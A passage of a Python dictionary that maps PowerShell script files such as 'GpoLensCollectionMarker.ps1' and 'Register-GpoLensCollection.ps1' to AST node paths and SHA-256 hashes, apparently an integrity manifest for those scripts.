        # ThrowStatementAst @ 0.1.4.0.1.4.1.0
        "0.1.4.0.1.4.1.0": ("7adbbcef3f8ed33a31bb8fb6a7d69f416eb994f2b299380e1e4d057240571413"),
        # FunctionDefinitionAst @ 0.1.5
        "0.1.5": ("6f6c42919b6013f73ffccfdecaa41c1119e2b4fddb5ae77bf20df41da701375a"),
        # AssignmentStatementAst @ 0.1.5.0.1.0
        "0.1.5.0.1.0": ("55bb61c98e3a87d50ea8c3c49c0f09b28e5f2b467988fcadb8f5cdbce544e458"),
        # IfStatementAst @ 0.1.5.0.1.1
        "0.1.5.0.1.1": ("7ad1e9c611c2dd8618aba3a3f00e325d9e00502bc604c309ec7a85977b872596"),
        # ThrowStatementAst @ 0.1.5.0.1.1.1.0
        "0.1.5.0.1.1.1.0": ("ff2db0832092aa858399a5a021b22c606f9605bd55b7f20eb18781d9364d8434"),
        # PipelineAst @ 0.1.5.0.1.2
        "0.1.5.0.1.2": ("59841bf6d046e137ac70f25f6a7d9842a3980ec45ae7e097f217bbaf60e9da2b"),
        # AssignmentStatementAst @ 0.1.5.0.1.3
        "0.1.5.0.1.3": ("e5c0921ec36f05df5ae77ce83a1097b24d52a719af6a0e670f1f4e63c3f972e3"),
        # AssignmentStatementAst @ 0.1.5.0.1.4
        "0.1.5.0.1.4": ("4a289b6ddad5ba494560f4da3bddf6817a9c75f672441fd49f31df4ef37df883"),
        # TryStatementAst @ 0.1.5.0.1.5
        "0.1.5.0.1.5": ("3f8eb3eb0ba118f1d3b67ffefa604e22f0fa07444e39cfeb9a0f8847446a7ec1"),
        # PipelineAst @ 0.1.5.0.1.5.0.0
        "0.1.5.0.1.5.0.0": ("0592ca6f3df885a41e779ceefb438b09a6248982229bf85f16819c7d86a303c8"),
        # PipelineAst @ 0.1.5.0.1.5.0.1
        "0.1.5.0.1.5.0.1": ("d04cd5c39f19362afd49f87afea71d40df9c11f97220a2ee35c8b3674786215c"),
        # IfStatementAst @ 0.1.5.0.1.5.0.2
        "0.1.5.0.1.5.0.2": ("f7969e163f3846c7c5e27216f65f02bac99b235d97fb06db850ccac483df739c"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.2.1.0
        "0.1.5.0.1.5.0.2.1.0": ("f40ba1b916d4141809119587a8328b2f59ba1b984fac4a2beaabbcb33eb111cc"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.2.1.1
        "0.1.5.0.1.5.0.2.1.1": ("5fe6749ba8caed7af705ae1a7bbfc899bdc47691bd0162871d67f1822e5d9483"),
        # IfStatementAst @ 0.1.5.0.1.5.0.2.1.2
        "0.1.5.0.1.5.0.2.1.2": ("820967b96f38a8de1beba91d09c46c18c94ab259b5c516a7269cf04d4148c42f"),
        # ThrowStatementAst @ 0.1.5.0.1.5.0.2.1.2.1.0
        "0.1.5.0.1.5.0.2.1.2.1.0": (
            "ade457f2e2c724d94cab4e7240cfb9fac813d9ca439f11c6cc5848bdac204e5f"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.2.1.3
        "0.1.5.0.1.5.0.2.1.3": ("8284eec5cd2fa0f228d804906b68508571d0941fd78d20ca14286bf86bbd65ed"),
        # ForEachStatementAst @ 0.1.5.0.1.5.0.2.1.4
        "0.1.5.0.1.5.0.2.1.4": ("e6a6b3ddd0ea0cf69158183e2b7825572f0056797183a387051353fb1059a8ea"),
        # PipelineAst @ 0.1.5.0.1.5.0.2.1.4.1.0.0.0.0
        "0.1.5.0.1.5.0.2.1.4.1.0.0.0.0": (
            "ad8bb1a76b005e5bdc9c0a751925c5dcc9b5966316bea2db3f61ba6c23adbd7f"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.2.1.4.2.0
        "0.1.5.0.1.5.0.2.1.4.2.0": (
            "972f1d37a358cf1b35d252b62e27bac83a47bc253857ceada3311cc045a5221e"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.2.1.4.2.1
        "0.1.5.0.1.5.0.2.1.4.2.1": (
            "d468133efcba2ee837a95d02e8c692051435e27eba1c57d45a89f4f480a65b5a"
        ),
        # ThrowStatementAst @ 0.1.5.0.1.5.0.2.1.4.2.1.1.0
        "0.1.5.0.1.5.0.2.1.4.2.1.1.0": (
            "778cdc3f8d48f39cb18fc838a30d74d783bed6d9eda86bffde2f316b3f49601a"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.2.1.4.2.2
        "0.1.5.0.1.5.0.2.1.4.2.2": (
            "3f387f73e2196d79402fb6cb9289f1aa030d25706413d622bc88bc3e97e9cb34"
        ),
        # ThrowStatementAst @ 0.1.5.0.1.5.0.2.1.4.2.2.1.0
        "0.1.5.0.1.5.0.2.1.4.2.2.1.0": (
            "71a081e5e4596dd37b6c4fecdd016f240b7a01658519be4ad166e4ffe4477c17"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.3
        "0.1.5.0.1.5.0.3": ("c13d0c44a224730c371c6343fcf516fd2d3366de153c9e4b6e2d85ee9ff057e3"),
        # PipelineAst @ 0.1.5.0.1.5.0.4
        "0.1.5.0.1.5.0.4": ("9a73df9d1590d1eac8e4e5c3c00d3a2413111b44ce2863d4d5865fc2333b6ee1"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.4.1.1.0.0.0
        "0.1.5.0.1.5.0.4.1.1.0.0.0": (
            "fff9f1fd4b0cce7d138344ef5f5abcc58a3504c1d00998848ffee601dd646b30"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.5
        "0.1.5.0.1.5.0.5": ("bc55f1da7f09b312500798b4fe2503cc477aa4c455b6df09ff5cc57c229a607a"),
        # PipelineAst @ 0.1.5.0.1.5.0.5.1.1.0.0.0
        "0.1.5.0.1.5.0.5.1.1.0.0.0": (
            "3c0fb8f97557985bdf45adc46f7bfaac5e58e28861bf51fa3e97cf4744200b1c"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.6
        "0.1.5.0.1.5.0.6": ("2bdec24523b25c1f1411612a197441f30e9336b51a1f0be1dd4021066f2a2d7b"),
        # PipelineAst @ 0.1.5.0.1.5.0.6.1.0.0.0
        "0.1.5.0.1.5.0.6.1.0.0.0": (
            "8e75ec1177f5663e75dd758a6f62608e96c055a8d0c8d8437edbde08989223d0"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.6.1.0.0.0.1.1.0.0.0
        "0.1.5.0.1.5.0.6.1.0.0.0.1.1.0.0.0": (
            "34f4062b38e2808fc6c7998676f03d7f670ce8a2aec67d987956e87bad34b498"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.7
        "0.1.5.0.1.5.0.7": ("616463ffbc82e844e951354122dda9c9b7bf4bc2b01ab59abe895b9ec92fad68"),
        # ThrowStatementAst @ 0.1.5.0.1.5.0.7.1.0
        "0.1.5.0.1.5.0.7.1.0": ("3e70fa62c820e580e7f1acf9a4c6e9949e15354c9121257759ffc8b92fb53e8c"),
        # PipelineAst @ 0.1.5.0.1.5.0.7.1.0.0.0.0.0.0.0
        "0.1.5.0.1.5.0.7.1.0.0.0.0.0.0.0": (
            "d404b55b7557900db3c663adcd04c299e476856f908493dda1c55bd35551f176"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.8
        "0.1.5.0.1.5.0.8": ("780af555bf20aee9c3f255544e404a80d56fe938923e070fda036d081f5f8d0c"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.9
        "0.1.5.0.1.5.0.9": ("b6b0dda406ded65dc792b3ec65a2745fcfab8d997ebcdb8c481f3437be11647a"),
        # PipelineAst @ 0.1.5.0.1.5.0.10
        "0.1.5.0.1.5.0.10": ("af67f5cd9fcca4411a72a588e7f94887ebeda202e0f97bbdfb10868b8fe10558"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.11
        "0.1.5.0.1.5.0.11": ("88aaa13c6cedac4cef2804a65abf45d033d79b9e1f6909b1f7fb72fb7566ec14"),
        # TryStatementAst @ 0.1.5.0.1.5.0.12
        "0.1.5.0.1.5.0.12": ("edb057b577e388166790882efff6dcb119e0cd5cb64c347fb219f82f1c60d1de"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.12.0.0
        "0.1.5.0.1.5.0.12.0.0": (
            "510587858eed5658446f040c447624242138bdf04315531d9c3c2111b65be2ba"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.12.0.1
        "0.1.5.0.1.5.0.12.0.1": (
            "5cd8be467155dc8f08386d54a6004b940d34052d6234a40cffc56471b4bf0669"
        ),
        # ThrowStatementAst @ 0.1.5.0.1.5.0.12.0.1.1.0
        "0.1.5.0.1.5.0.12.0.1.1.0": (
            "fd58727e80881af0650b58c392d1993828e4d5b3842a7b4c066967d7d6ce2b96"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.12.0.2
        "0.1.5.0.1.5.0.12.0.2": (
            "6c9d047a816d75c8ff095d13a2e13ecc52f7d09f740a33a0d71fe8854ba10723"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.12.0.2.1.0
        "0.1.5.0.1.5.0.12.0.2.1.0": (
            "09711bc5b969aeacc19d40933ed2bf5dd706c2b4a4664b8fa76b7daf1ddf4ff0"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.12.0.2.1.1
        "0.1.5.0.1.5.0.12.0.2.1.1": (
            "1c416041e05eada55c50a1594884c8a4d10ea58bcff64b441d2d0c68c5954288"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.12.0.2.1.2
        "0.1.5.0.1.5.0.12.0.2.1.2": (
            "29e352cc766a978945505b9a3be592bc2a38d7a52b5dea3196a5dcd07f915d88"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.12.0.2.1.2.1.0
        "0.1.5.0.1.5.0.12.0.2.1.2.1.0": (
            "704ad40e7a5d15479ae62b462b05aac2976f141505c3fcf0f638b830943216ad"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.12.0.2.1.3
        "0.1.5.0.1.5.0.12.0.2.1.3": (
            "51aad75bf8b6b9b5c5d032dbb8550c348003c963a7e471999b38dc7959bb7d33"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.12.0.2.1.4
        "0.1.5.0.1.5.0.12.0.2.1.4": (
            "c51b396fc780ca888e89d63f1c350eae1d94b44d1f1b14ba76da0ec9ee7cf584"
        ),
        # TryStatementAst @ 0.1.5.0.1.5.0.12.0.2.1.5
        "0.1.5.0.1.5.0.12.0.2.1.5": (
            "6b24a4ef49e6b5528a98aec334320f956bee57fb86d5c816bf86d5a4edce5bc3"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.12.0.2.1.5.0.0
        "0.1.5.0.1.5.0.12.0.2.1.5.0.0": (
            "13f85fc2ea715564039e0593f7c6d6864eb7680c92d71f2e6f3ec3bc454946ea"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.12.0.2.1.5.1.0
        "0.1.5.0.1.5.0.12.0.2.1.5.1.0": (
            "4da68369437935132ab88fa36715083e04adf9fc87381769b4e4a2b0e08b9d3d"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.12.1.0.0
        "0.1.5.0.1.5.0.12.1.0.0": (
            "f3420047e1f15630eb1e7ecf1f01cd7a8ed02f4aeedd752fb5489ee20aca6d2e"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.12.1.0.0.1.0
        "0.1.5.0.1.5.0.12.1.0.0.1.0": (
            "35726c4a76c5f8b2afcc5c308856ed5fb9ad9ed339c2740ae116d831292ad5bc"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.12.1.0.1
        "0.1.5.0.1.5.0.12.1.0.1": (
            "9b139817f1e702daf496ddc89efdabbf9e7c893b74a83d87b009d0e63849dd09"
        ),
        # ThrowStatementAst @ 0.1.5.0.1.5.0.12.1.0.2
        "0.1.5.0.1.5.0.12.1.0.2": (
            "19dd6138be5494e2546606c2a5fc903db24aec7c1765d67eb0ef514a51316356"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.12.2.0
        "0.1.5.0.1.5.0.12.2.0": (
            "42cb3c09451353eca9cc55348137e7fc21edab579a59daeca12339740da9dfd0"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.12.2.0.1.0
        "0.1.5.0.1.5.0.12.2.0.1.0": (
            "bca3576b61686df078c27617f47dcf3354f034860a83f45e02854773101699af"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.13
        "0.1.5.0.1.5.0.13": ("f689970a515914f6d2e03c1549ecc80d390f6c6f7b77e16312d09fa44a9c6c1a"),
        # PipelineAst @ 0.1.5.0.1.5.0.13.1.0
        "0.1.5.0.1.5.0.13.1.0": (
            "3b5c72ea48e6517be742b218a6432963fa94bc3d504f902afe8cdce9859baa97"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.13.1.1
        "0.1.5.0.1.5.0.13.1.1": (
            "6af47529f486d9b60c8e0532b32f5d5cfa9824d06c0f33644335f7272fc8a63d"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.13.1.2
        "0.1.5.0.1.5.0.13.1.2": (
            "3bd0e3a8abfb7a4d5d2f8758ecc63561cd52577c80f89354a2c05eb24fd65fe0"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.13.1.2.1.0.1.0.0
        "0.1.5.0.1.5.0.13.1.2.1.0.1.0.0": (
            "9430cf8fe691e2329d224da9cb1d4b22a728e5c2fc9e92790d0340a662d0d587"
        ),
        # TryStatementAst @ 0.1.5.0.1.5.0.13.1.3
        "0.1.5.0.1.5.0.13.1.3": (
            "af841638d93bb7f3810f8b169526004dc200659609a108ce375d1c8d3b5744b2"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.13.1.3.0.0
        "0.1.5.0.1.5.0.13.1.3.0.0": (
            "bf483030af83bd0c1ca4faecc830ba31214584cf6e851fccfefea56a110e3d59"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.13.1.3.0.1
        "0.1.5.0.1.5.0.13.1.3.0.1": (
            "6a53aa44a1f5b81e51b85de226d9f8da6e1fe1b964d269b7360c817b4f262177"
        ),
        # IfStatementAst @ 0.1.5.0.1.5.0.13.1.3.1.0
        "0.1.5.0.1.5.0.13.1.3.1.0": (
            "e4fe7fa637bd0777105a055a52800de0b74f8e4150199f078db3f9a71f2eb9ed"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.13.1.3.1.0.1.0
        "0.1.5.0.1.5.0.13.1.3.1.0.1.0": (
            "3c3a9b671b202700d750d6add6248cbb0604e28ad9f198511954853543dedd5d"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.13.1.4
        "0.1.5.0.1.5.0.13.1.4": (
            "d30d69339897c73983202d330131e52f82fc4800c0aa9f8284d1c7d2b67cae3c"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.14
        "0.1.5.0.1.5.0.14": ("cc55d38c0dfad5f32057b89d529c06b30e818115b61249d483d271972161c2c0"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.15
        "0.1.5.0.1.5.0.15": ("32de7b26638b781cbb24018e1002393f1f55e694bbdee756295e141261fa18f1"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.16
        "0.1.5.0.1.5.0.16": ("c23fdca88e989b5f13efb3d5985063f7b8f00e26856675bd43cac450f81504c2"),
        # PipelineAst @ 0.1.5.0.1.5.0.16.1.0.0.0
        "0.1.5.0.1.5.0.16.1.0.0.0": (
            "36e30bd6726e9996cf1ce465e8be6d17393ae89d958303076b7a8e98316e83e9"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.16.1.0.0.0.1.1.0.0.0
        "0.1.5.0.1.5.0.16.1.0.0.0.1.1.0.0.0": (
            "eb7f05a62a286bcb9e7387e0e35c2d415fe72bd3e194d10e4b13d14ad552a7de"
        ),
        # ForEachStatementAst @ 0.1.5.0.1.5.0.17
        "0.1.5.0.1.5.0.17": ("0b2571ff8f240ff2de43fd9d2e8a1d8e660cc135db0bf0216339571e85d24760"),
        # AssignmentStatementAst @ 0.1.5.0.1.5.0.17.2.0
        "0.1.5.0.1.5.0.17.2.0": (
            "0e8a79d1a3ff27aeedd39096644853cfa21408c78e9595e63669a703cb0313ee"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.17.2.1
        "0.1.5.0.1.5.0.17.2.1": (
            "ca3bcd64ef2deafb0e0fe3b978cec0fa20371a7d867db5142a5fef0ce07d6744"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.17.2.2
        "0.1.5.0.1.5.0.17.2.2": (
            "78f27357c0cad10e80831f47e170cf63a75ed850c02cce056d40bd295d2fe522"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.17.2.3
        "0.1.5.0.1.5.0.17.2.3": (
            "1b9f9244e39d0d2a66db3b7de70f981859d6189c375af05c1a2f3b7d5d1aa1ee"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.18
        "0.1.5.0.1.5.0.18": ("8fdb73936b85d1c4a91f0731fb70a19ed7e53b787bc88a5ac1bda62ff50b5181"),
        # PipelineAst @ 0.1.5.0.1.5.0.18.0.3.0.0.0
        "0.1.5.0.1.5.0.18.0.3.0.0.0": (
            "cbb3ae43bb09b726bcb9b22babc0b6abe3776713fd6cf24f2b747a7f19afd3ab"
        ),
        # PipelineAst @ 0.1.5.0.1.5.0.19
        "0.1.5.0.1.5.0.19": ("bbb497f81451cecfbec638b106c85ccd086dd3c81731ff437528e9fb491e0dbe"),
        # PipelineAst @ 0.1.5.0.1.5.0.19.0.1.0.0.0
        "0.1.5.0.1.5.0.19.0.1.0.0.0": (
            "25995df5b9bfb6e9dd512bc8d3e094197a188833a8cfaf47cdef68c480b09fe0"
        ),
        # AssignmentStatementAst @ 0.1.5.0.1.5.1.0.0
        "0.1.5.0.1.5.1.0.0": ("a3f7698e6e966dc8829c25e02d2f73f16c697b02c6b42f29c22a4dda3e014d2a"),
        # TryStatementAst @ 0.1.5.0.1.5.1.0.1
        "0.1.5.0.1.5.1.0.1": ("88983a776e84d4a550279deb510db7e1107888e1e4d66d85ba2fb741c131079a"),
        # PipelineAst @ 0.1.5.0.1.5.1.0.1.0.0
        "0.1.5.0.1.5.1.0.1.0.0": (
            "c071e6b1a9974aedb29ea8c2194c37952b1ceadcc547caa8bafa9ff63de179f7"
        ),
        # PipelineAst @ 0.1.5.0.1.5.1.0.1.0.0.0.3.0.0.0
        "0.1.5.0.1.5.1.0.1.0.0.0.3.0.0.0": (
            "8f6e922dc4b31bac8a0f3815afeac9db1f9f98aaec8f2ffe4a699c447db1af8e"
        ),
        # PipelineAst @ 0.1.5.0.1.5.1.0.1.1.0.0
        "0.1.5.0.1.5.1.0.1.1.0.0": (
            "bc5bf95b2d2b5172c4bbd4a51efad04fe4acc99dd43f1054cd36b2277602adf6"
        ),
        # ThrowStatementAst @ 0.1.5.0.1.5.1.0.2
        "0.1.5.0.1.5.1.0.2": ("d43f1a324c99b09761131c064b6ef8d9e4c09d2657b3e32bc0d8d592df80dfec"),
        # PipelineAst @ 0.1.5.0.1.5.2.0
        "0.1.5.0.1.5.2.0": ("607bdc0fc639a3413fc4c2452d4f36b976d98ccc7782ddcf3536d1b893d397a4"),
        # IfStatementAst @ 0.1.6
        "0.1.6": ("64feee33072d75e27609ca99b752cd4130530a57078582ec1418d78c9d8c036b"),
        # TryStatementAst @ 0.1.6.1.0
        "0.1.6.1.0": ("46912dd542c14ad402245ad03865a3bfc4310e2d63bd8f03253a03c4c1d98579"),
        # IfStatementAst @ 0.1.6.1.0.0.0
        "0.1.6.1.0.0.0": ("cdd41eb373aa7a9718ce094eb800073fbe6190ee313befd1af7f5d9bba9cd672"),
        # ThrowStatementAst @ 0.1.6.1.0.0.0.1.0
        "0.1.6.1.0.0.0.1.0": ("ea1ef5044538c2e47b7bb5f9add6af334b7059738b5e311149bb4005074d9f77"),
        # PipelineAst @ 0.1.6.1.0.0.1
        "0.1.6.1.0.0.1": ("2c49aa48d7a1fc11bb8e34f177cf84e64b1bf9166ad34cbe034867971a7763c1"),
        # PipelineAst @ 0.1.6.1.0.1.0.0
        "0.1.6.1.0.1.0.0": ("27ac550ac8a626dd5bf367421db1e59824c868f3d29d9a6c01e3f26ee7d8ee04"),
        # PipelineAst @ 0.1.6.1.0.1.0.0.0.1.0.0.0
        "0.1.6.1.0.1.0.0.0.1.0.0.0": (
            "737699cb5b2acc5808a9e754f523b4b6663701546d32d6b63fefd1fbb9086c25"
        ),
        # ExitStatementAst @ 0.1.6.1.0.1.0.1
        "0.1.6.1.0.1.0.1": ("ce286dea8fc667f63d2efc4d8f965e4e895cfff631dd4b1a6f95eebf2955197a"),
    },
    "GpoLensCollectionMarker.ps1": {
        # FunctionDefinitionAst @ 0.0.0
        "0.0.0": ("5b527c7e9d2d59c1ace983da3d607a51c15dab1bfcfafc68c8a135c6eea752f5"),
        # IfStatementAst @ 0.0.0.0.1.0
        "0.0.0.0.1.0": ("a449be3dc9093db0795bead81a07f2170d722f309df542264a109de781fd539d"),
        # ThrowStatementAst @ 0.0.0.0.1.0.1.0
        "0.0.0.0.1.0.1.0": ("7b72ee5bf052e453b5a5e04ab120d8eff182486ae46f4f7426bab76ff9939100"),
        # AssignmentStatementAst @ 0.0.0.0.1.1
        "0.0.0.0.1.1": ("945e89bde9e9a811a26322d8c0e43d739a2e459d2f39a226bdd29189940589e4"),
        # TryStatementAst @ 0.0.0.0.1.2
        "0.0.0.0.1.2": ("436891a56edb6bcef69d3ea077b736e8417c93285029bed0c5652ef779434e3e"),
        # IfStatementAst @ 0.0.0.0.1.2.0.0
        "0.0.0.0.1.2.0.0": ("d51d2606863fd7ce3afc79f1023210bbfd98a113c0918ba6463d3af1cbd27cfe"),
        # IfStatementAst @ 0.0.0.0.1.2.0.0.1.0
        "0.0.0.0.1.2.0.0.1.0": ("1dc8f8ce978c8bc49beface8c683c7f858a49a720c746ca5660ab2197ddb8374"),
        # PipelineAst @ 0.0.0.0.1.2.0.0.1.0.1.0
        "0.0.0.0.1.2.0.0.1.0.1.0": (
            "777524182fccc10e6c3ffba56bb285f8b99cc18dc4711ff62602664e6bba63f9"
        ),
        # AssignmentStatementAst @ 0.0.0.0.1.2.0.0.1.1
        "0.0.0.0.1.2.0.0.1.1": ("8a51aea9914d2a4002ea02487f999f91b38855f215832af2018ff673583d7f23"),
        # AssignmentStatementAst @ 0.0.0.0.1.2.0.0.2.0
        "0.0.0.0.1.2.0.0.2.0": ("cb2c805e83f31b6d546ec61fc8c185803fc9b7f540c3e655dbf96cfef247cd07"),
        # AssignmentStatementAst @ 0.0.0.0.1.2.0.0.2.1
        "0.0.0.0.1.2.0.0.2.1": ("942e4d518eefdde54516297370e012f359b0c42187b915e448f61bdb87c2bcf7"),
        # IfStatementAst @ 0.0.0.0.1.2.0.0.2.2
        "0.0.0.0.1.2.0.0.2.2": ("9c82d31f72e4cb45d9c6b9d78f7383dab97d04d89a11b9a9cf4e0d73b6499e5c"),
        # ThrowStatementAst @ 0.0.0.0.1.2.0.0.2.2.1.0
        "0.0.0.0.1.2.0.0.2.2.1.0": (
            "7fb46a6264399dba6c559f71a15dfe58d9cf97f06391108c78696414e6708c4f"
        ),
        # AssignmentStatementAst @ 0.0.0.0.1.2.0.0.2.3
        "0.0.0.0.1.2.0.0.2.3": ("4acd4ff050cc517900011ce94150dec5d1e7ddbd49ee9e18c96d4b263e616f86"),
        # AssignmentStatementAst @ 0.0.0.0.1.2.0.0.2.4
        "0.0.0.0.1.2.0.0.2.4": ("e17c0c417443c4255ae8c02fd8be7873245624aaf216ecf8b56a96efb50a8933"),
        # IfStatementAst @ 0.0.0.0.1.2.0.0.2.5
        "0.0.0.0.1.2.0.0.2.5": ("3b9237b3365cc25d4f37a523f76eaf9947ac74680a9e4c059c5d31d6b109d427"),
        # ThrowStatementAst @ 0.0.0.0.1.2.0.0.2.5.1.0
        "0.0.0.0.1.2.0.0.2.5.1.0": (
            "f2f8b8dabab90e4e15f333caf4796c4c926e4dfcc2be40e831fa9bc4ffbb921b"
        ),
        # IfStatementAst @ 0.0.0.0.1.2.0.1
        "0.0.0.0.1.2.0.1": ("f8f1809d9ad3742e7fb5cb35743ebafa028ab52a02472895d79f0f2396c8aec2"),
        # ThrowStatementAst @ 0.0.0.0.1.2.0.1.1.0
        "0.0.0.0.1.2.0.1.1.0": ("5e05bb60df97aa832850272fa6e421d0aabcc1c8183f602e6770b66c126b20ca"),
        # AssignmentStatementAst @ 0.0.0.0.1.2.0.2
        "0.0.0.0.1.2.0.2": ("bb11e2230f5d5d280b4f5845bbccf95bb4daa7843a413a4e84cc5c2086444d04"),
        # TryStatementAst @ 0.0.0.0.1.2.0.3
        "0.0.0.0.1.2.0.3": ("ac42b5809a36145d0a13980fc5b8bdb98a64addea7640470c6c2fa98839b8d1c"),
        # PipelineAst @ 0.0.0.0.1.2.0.3.0.0
        "0.0.0.0.1.2.0.3.0.0": ("417d95eeffedefe0045cea7ef8992fa3a194b38d4e48497b070111272d4aba5c"),
        # ReturnStatementAst @ 0.0.0.0.1.2.0.3.0.1
        "0.0.0.0.1.2.0.3.0.1": ("f3f4421e218ec5cf51f7c5d88795f5b8f9a1ce0975d465be3b33ba85543a8919"),
        # PipelineAst @ 0.0.0.0.1.2.0.3.1.0
        "0.0.0.0.1.2.0.3.1.0": ("301a6a3dbe6bc3b75df5edad32ff999514bc9467620da7658219ad95b548a728"),
        # PipelineAst @ 0.0.0.0.1.2.1.0
        "0.0.0.0.1.2.1.0": ("1225495836f47a7f0b9025bebcb980950c93b3c72feb12b39e27a9a90e4d9b85"),
        # FunctionDefinitionAst @ 0.0.1
        "0.0.1": ("c3af220c56dac954faf04db0afb64acaa40a94ccbbe0b24fe059e1a3d61987d7"),
        # AssignmentStatementAst @ 0.0.1.0.1.0
        "0.0.1.0.1.0": ("2ff0ebf6230c8b8becd3f5b7cdff025bc629266032c1e3861a9c539435decdf9"),
        # IfStatementAst @ 0.0.1.0.1.1
        "0.0.1.0.1.1": ("c316500ecdfca82213ce8f3140314162ebd5afdbc4c27be3b17b71a6a8ee1d95"),
        # ThrowStatementAst @ 0.0.1.0.1.1.1.0
        "0.0.1.0.1.1.1.0": ("49881fd45c00d9a5f323dfae1f5aeb4462baedce54f8822ac4b91035eda0fe55"),
        # AssignmentStatementAst @ 0.0.1.0.1.2
        "0.0.1.0.1.2": ("67cfc3d8b7347087657526d9eeeb9dcc13f294f46e99b595a4ae829b0caeac6f"),
        # PipelineAst @ 0.0.1.0.1.3
        "0.0.1.0.1.3": ("5b6bb41d5b16eeffd0f8a5d1bc97f76d489cd30e82f75bcb0062b7d246766d5e"),
        # AssignmentStatementAst @ 0.0.1.0.1.4
        "0.0.1.0.1.4": ("8e1f793eb462a8149a947fbfbfeafb348196b4fdbec28075dbd1eeec5d3c8725"),
        # TryStatementAst @ 0.0.1.0.1.5
        "0.0.1.0.1.5": ("a6add24f837645c76f200a3824176a27a1cf1ffa6f6f40361542bf68462126d2"),
        # PipelineAst @ 0.0.1.0.1.5.0.0
        "0.0.1.0.1.5.0.0": ("f4b6a3fd3023e10c5f3a29476fff53f7481654cbaf3f8cf8c3ec855199801337"),
        # PipelineAst @ 0.0.1.0.1.5.1.0
        "0.0.1.0.1.5.1.0": ("c3aa985d41fe816495183dee6a3ae1bfba1057b9349837d6eb3135fa3bd4d116"),
    },
    "Register-GpoLensCollection.ps1": {
        # PipelineAst @ 0.0.11.0.0.0.0.0
        "0.0.11.0.0.0.0.0": ("29fdf4aa4c48fbdb88a28f09091f24c926b898f08d23b2648def49c533062d67"),
        # PipelineAst @ 0.1.0
        "0.1.0": ("13eeb6275641f82bb92a9c85674891dad494087cf04bef5811d862ba81ecae78"),
        # FunctionDefinitionAst @ 0.1.1
        "0.1.1": ("1772103fecae71c4a7a4aaceefc025b320f1d057d7d99da40b42a9e68a59101e"),
        # IfStatementAst @ 0.1.1.0.1.0
        "0.1.1.0.1.0": ("618534a7b3f7d9e83788a4dfcbfb28c0a2687398baf67c5ff949bbded52444d6"),
        # ThrowStatementAst @ 0.1.1.0.1.0.1.0
        "0.1.1.0.1.0.1.0": ("6db3e07e6ed8328cb4bfa61c9f20da1278fe0a6f5126375cdddc0e63f29f16f8"),
        # ReturnStatementAst @ 0.1.1.0.1.1
        "0.1.1.0.1.1": ("8c97a6ef6762b79f1284472fe636732b0d1bcd6330c744164f30d7e4e3c16f66"),
        # FunctionDefinitionAst @ 0.1.2
        "0.1.2": ("b729c43f5a4e7a8a9f8d32b9d07d7aec3f3a4b50e2de33cd768a9505d8bc1c83"),
        # IfStatementAst @ 0.1.2.0.1.0
        "0.1.2.0.1.0": ("938bbd4f97dff9d623172eb297e4fb837ef1665670de940abcf16cff1c35515a"),
        # ReturnStatementAst @ 0.1.2.0.1.0.1.0
        "0.1.2.0.1.0.1.0": ("c2e5db9853e464a9aad29499ae1d106cd4b8dd2454554400cb1ac246a7d29d23"),
        # ReturnStatementAst @ 0.1.2.0.1.1
        "0.1.2.0.1.1": ("346b07b95809bc6a7e040277ae4560bee4fed09c165822b805f45c998d9ef18c"),
        # FunctionDefinitionAst @ 0.1.3
        "0.1.3": ("163b822589d57d234bcb7b16f7d9d4259b4273d7404f767676d1ec18bb91bff9"),
        # IfStatementAst @ 0.1.3.0.1.0
        "0.1.3.0.1.0": ("d0cf1b18faf8319177deb05947b9921a3e4170ceccfb0fb7649e057508f63fb1"),
        # ThrowStatementAst @ 0.1.3.0.1.0.1.0
        "0.1.3.0.1.0.1.0": ("077329acf98ca8248bc1905de4fc148416c786c8e34db22642209d68ea6fd1b7"),
        # PipelineAst @ 0.1.3.0.1.1
        "0.1.3.0.1.1": ("f071250e8bb1c222acf7ca048e1eca210d1dda65a8bf4112b55382fd1e7f4d66"),
